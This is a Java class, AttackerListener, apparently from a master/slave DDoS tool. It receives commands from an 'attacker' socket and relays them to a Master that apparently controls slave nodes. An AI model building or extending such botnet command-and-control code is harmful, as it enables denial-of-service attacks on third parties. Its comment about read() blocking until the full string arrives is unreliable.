/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package ddos.server;

import ddos.slave.MasterListener;
import java.io.InputStream;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author bruno
 */
public class AttackerListener implements Runnable {
    
    private Master m;
    private Socket s;
    
    AttackerListener(Master m, Socket s) {
        this.m = m;
        this.s = s;
    }

    @Override
    public void run() {
        
        System.out.println("AttackerListener - START");
                try {
            InputStream is = this.s.getInputStream();
            
            while (!this.s.isClosed()) {
                
                int len =  is.read();
                if (len == -1) {
                    this.s.close();
                    break;
                }
                
                byte[] b = new byte[len]; // blocks until we have receive the lenght of the string
                is.read(b, 0, b.length); // blocks until we have the whole string
                
                String s = new String(b);
                System.out.println("Read: " + s);
                
                if ("--stop-master".equals(s)) {
                    this.m.close();
                } else {
                    this.m.send(s);
                }
            }
        } catch (Exception ex) {
            Logger.getLogger(MasterListener.class.getName()).log(Level.SEVERE, null, ex);
        } finally {
           System.out.println("AttackerListener - END");
       }
    }
    
    
    
}
